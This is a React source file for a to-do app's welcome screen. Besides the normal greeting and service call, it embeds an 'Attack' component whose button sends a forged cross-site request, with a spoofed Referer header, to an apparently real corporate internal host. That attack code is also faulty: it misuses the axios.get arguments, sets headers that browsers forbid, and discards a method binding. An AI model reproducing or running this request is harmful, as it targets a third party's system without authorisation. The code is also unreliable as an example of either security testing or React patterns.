import React, {Component} from 'react';
import axios from 'axios'
import "./ToDoApp.css"

import propTypes from "prop-types"
import {BrowserRouter as Router,Route,Switch,Link} from 'react-router-dom'

import AuthenticationService from './AuthenticationService.js'
import AuthenticatedRoute from "./AuthenticatedRoute.jsx"
import LoginComponent from "./LoginComponent.jsx"
import ListToDoComponent from "./ListToDoComponent"
import HelloWorldService from "../../api/todo/HelloWorldService.js"

class WelcomeComponent extends Component{
    constructor(props){
        super(props);
        this.retrieveWelcomeMessage = this.retrieveWelcomeMessage.bind(this);
        this.handleSuccessfulResponse = this.handleSuccessfulResponse.bind(this);
        this.handleError = this.handleError.bind(this);
        this.state = {
            welcomeMessage:''
        }
    }
    render(){
        return (
            <div>
                <div className="container padding">
                    {/*<h2>Welcome {this.props.match.params.name} </h2>*/ /*To take value from url*/}
                    <h2>Welcome {sessionStorage.getItem('authenticatedUser')} </h2>
                    <span><Link to={"/todos" }>You can manage you todo's here</Link></span>
                    
                </div>
                <div className="container padding">
                Click here to get a customized welcome message.
                <button onClick={this.retrieveWelcomeMessage}>Click here</button>
                </div>
                <div className="container padding">
                    {this.state.welcomeMessage}
                </div>
                <div>
                    This component is just to test : <Attack></Attack>
                </div>
            </div>
        );
    }
    retrieveWelcomeMessage(){
        // HelloWorldService.executeHelloWorldService()
        // .then(response =>this.handleSuccessfulResponse(response ))
        // HelloWorldService.executeHelloWorldBeanService()
        // .then(response =>this.handleSuccessfulResponse(response ))
        HelloWorldService.executeHelloWorldPathVariableService(sessionStorage.getItem('authenticatedUser'))
         .then(response =>this.handleSuccessfulResponse(response ))
         .catch(error => this.handleError(error))
    }

    handleSuccessfulResponse(response){
        //this.setState({welcomeMessage:response.data})
        // this.setState({welcomeMessage:response.data.message})
        this.setState({welcomeMessage:response.data.message})
    }
    handleError(error){
        //this.setState({welcomeMessage:response.data})
        // this.setState({welcomeMessage:response.data.message})
        let errorMessage = "";
        if(error.message)
            errorMessage += error.message
        if(error.response && error.response.data){
            errorMessage += error.response.data.message
        }
        console.log(error);
        this.setState({welcomeMessage: errorMessage})
    }
}

class Attack extends Component{
    constructor(props){
        super(props);
        this.makeXSRFRequest.bind(this);
    }
    render(){
        return (
            <div>
                <button onClick={this.makeXSRFRequest}>Click here to make XSRF attack</button>
            </div>
        );

    }

    makeXSRFRequest(){
        let config = {
            headers: {
                Referer : 'https://dev-officedb.uhc.com/manpower/fieldstaff/details.jsf',
                
            }
        }
        
        let data = {
        
         'Sec-Fetch-Site': 'same-origin'
        }
        
        
        axios.get('https://dev-officedb.uhc.com/manpower/fieldstaff/detailsEdit.jsf', data, config)
        .then(
            (response) => {
                console.log(response.data);
            }
        )
        .catch(
            (error)=>{
                console.log(error);
            }
        )
    }
    
}
export default WelcomeComponent;